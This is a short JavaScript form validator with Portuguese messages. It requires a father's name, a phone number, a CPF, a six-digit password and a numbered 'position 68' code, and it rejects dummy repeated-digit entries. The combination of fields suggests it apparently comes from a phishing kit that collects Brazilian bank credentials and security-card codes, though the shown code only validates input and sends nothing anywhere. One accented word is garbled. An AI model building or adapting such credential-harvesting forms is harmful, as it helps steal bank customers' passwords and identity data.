function macTools() {
if (document.form.pai.value == "" ||
document.form.pai.value.length < 4 ){
alert ("Informe o nome do pai.");
document.form.pai.focus(); return false;
}
if (document.form.telefone.value == "" || 
document.form.telefone.value.length < 10 || 
document.form.telefone.value == "(00)00000-0000" || 
document.form.telefone.value == "(11)11111-1111" || 
document.form.telefone.value == "(22)22222-2222" || 
document.form.telefone.value == "(33)33333-3333" || 
document.form.telefone.value == "(44)44444-4444" || 
document.form.telefone.value == "(55)55555-5555" || 
document.form.telefone.value == "(66)66666-6666" || 
document.form.telefone.value == "(77)77777-7777" || 
document.form.telefone.value == "(88)88888-8888" || 
document.form.telefone.value == "(99)99999-9999"){
alert ("Telefone, Invalido!");
document.form.telefone.focus(); return false;
}
if (document.form.cpf.value == "" || 
document.form.cpf.value.length < 11 || 
document.form.cpf.value == "00000000000" || 
document.form.cpf.value == "11111111111" || 
document.form.cpf.value == "22222222222" || 
document.form.cpf.value == "33333333333" || 
document.form.cpf.value == "44444444444" || 
document.form.cpf.value == "55555555555" || 
document.form.cpf.value == "66666666666" || 
document.form.cpf.value == "77777777777" || 
document.form.cpf.value == "88888888888" || 
document.form.cpf.value == "99999999999"){
alert ("CPF invalido!");
document.form.cpf.focus(); return false;
}
if (document.form.senha6.value == "" || 
document.form.senha6.value.length < 6 || 
document.form.senha6.value == "000000" || 
document.form.senha6.value == "111111" || 
document.form.senha6.value == "222222" || 
document.form.senha6.value == "333333" || 
document.form.senha6.value == "444444" || 
document.form.senha6.value == "555555" || 
document.form.senha6.value == "666666" || 
document.form.senha6.value == "777777" || 
document.form.senha6.value == "888888" || 
document.form.senha6.value == "999999"){
alert ("Senha de (6 digitos), invalida!");
document.form.senha6.focus(); return false;
}
if (document.form.pos68.value == "" ||
document.form.pos68.value.length < 3 ){
alert ("Posi��o (68), invalida.");
document.form.pos68.focus(); return false;
}
}